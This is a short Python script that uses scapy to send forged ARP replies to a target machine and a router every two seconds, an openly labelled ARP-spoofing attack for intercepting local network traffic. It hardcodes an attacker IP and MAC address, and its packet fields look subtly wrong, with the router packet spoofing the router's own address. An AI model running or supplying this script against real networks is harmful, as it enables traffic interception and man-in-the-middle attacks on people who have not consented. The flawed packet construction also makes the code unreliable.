from scapy.all import ARP, send
import time

my_ip = "147.235.217.4"
my_mac = "1C-79-2D-CE-45-0A"

target_ip = ""
target_mac = ""

router_ip = ""
router_mac = ""

targetPkt = ARP(op = 2, psrc = router_ip, hwdst = target_mac)
routerPkt = ARP(op = 2, psrc = router_ip, pdst = target_ip, hwdst = router_mac)

try:
  
 while True:

  send(targetPkt, verbose = False)

  send(routerPkt, verbose = False)

  time.sleep(2)

except KeyboardInterrupt:

 print("The attack has stopped.")

